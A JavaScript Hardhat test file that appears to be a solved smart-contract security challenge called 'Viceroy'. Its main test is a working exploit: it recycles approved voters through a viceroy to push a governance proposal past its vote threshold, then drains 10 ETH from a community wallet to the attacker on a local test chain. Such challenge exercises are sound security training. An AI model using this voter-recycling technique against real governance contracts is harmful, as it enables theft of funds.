const { expect, use } = require("chai")
const { ethers } = require("hardhat")
const { BigNumber } = ethers
const helpers = require("@nomicfoundation/hardhat-network-helpers")
const { toUtf8Bytes } = require("ethers/lib/utils")

use(require("chai-as-promised"))

describe("Viceroy", async function () {
  let attackerWallet, attacker, oligarch, governance, communityWallet

  before(async function () {
    ;[_, attackerWallet] = await ethers.getSigners()

    // Name your contract GovernanceAttacker. It will be minted the NFT it needs.
    const AttackerFactory = await ethers.getContractFactory(
      "GovernanceAttacker",
    )
    attacker = await AttackerFactory.connect(attackerWallet).deploy()
    await attacker.deployed()

    const OligarchFactory = await ethers.getContractFactory("OligarchyNFT")
    oligarch = await OligarchFactory.deploy(attacker.address)
    await oligarch.deployed()

    const GovernanceFactory = await ethers.getContractFactory("Governance")
    governance = await GovernanceFactory.deploy(oligarch.address, {
      value: BigNumber.from("10000000000000000000"),
    })
    await governance.deployed()

    const walletAddress = await governance.communityWallet()
    communityWallet = await ethers.getContractAt(
      "CommunityWallet",
      walletAddress,
    )
    expect(await ethers.provider.getBalance(walletAddress)).equals(
      BigNumber.from("10000000000000000000"),
    )
  })

  // prettier-ignore;
  it("conduct your attack here", async function () {
    const [, , ...signers] = await ethers.getSigners();

    // attacker appointViceroy to an EOA
    // viceroy approveVoter 5x (other EOA)
    // voter create proposal(data = abi.encodeFunctionWithSignature(exec())) & voteOnProposal
    // viceroy disapproveVoter & reapprove another 5 voter
    // call executeProposal to send all the balance of governance to attacker
    await attacker.attack(governance.address, signers[0].address);
    for (let i =1; i<6; i++){
      await governance.connect(signers[0]).approveVoter(signers[i].address);
    }
    console.log("viceroy appointment",await governance.viceroys(signers[0].address))
    let ABI = ["function exec(address target, bytes calldata data, uint256 value) external"];
    let iface = new ethers.utils.Interface(ABI);
    const proposalData = iface.encodeFunctionData("exec", [attackerWallet.address,"0x00", BigNumber.from("10000000000000000000")]);

    // equivalent to uint256(keccak256(proposalData))
    const proposalId = ethers.BigNumber.from(ethers.utils.keccak256(proposalData));

    await governance.connect(signers[0]).createProposal(signers[0].address, proposalData.toString());
  
    for (let i =1; i<6; i++){
      await governance.connect(signers[i]).voteOnProposal(proposalId,true,signers[0].address);
    }
    for (let i =1; i<6; i++){
      await governance.connect(signers[0]).disapproveVoter(signers[i].address);
    }
    
    for (let i =1; i<6; i++){
      await governance.connect(signers[0]).approveVoter(signers[i+5].address);
    }

       
    for (let i =1; i<6; i++){
      await governance.connect(signers[i+5]).voteOnProposal(proposalId,true,signers[0].address);
    }
   
    await governance.connect(signers[0]).executeProposal(proposalId);
    
  });

  after(async function () {
    const walletBalance = await ethers.provider.getBalance(
      communityWallet.address,
    )
    expect(walletBalance).to.equal(0)

    const attackerBalance = await ethers.provider.getBalance(
      attackerWallet.address,
    )
    expect(attackerBalance).to.be.greaterThanOrEqual(
      BigNumber.from("10000000000000000000"),
    )

    expect(
      await ethers.provider.getTransactionCount(attackerWallet.address),
    ).to.equal(2, "must exploit in one transaction")
  })
})
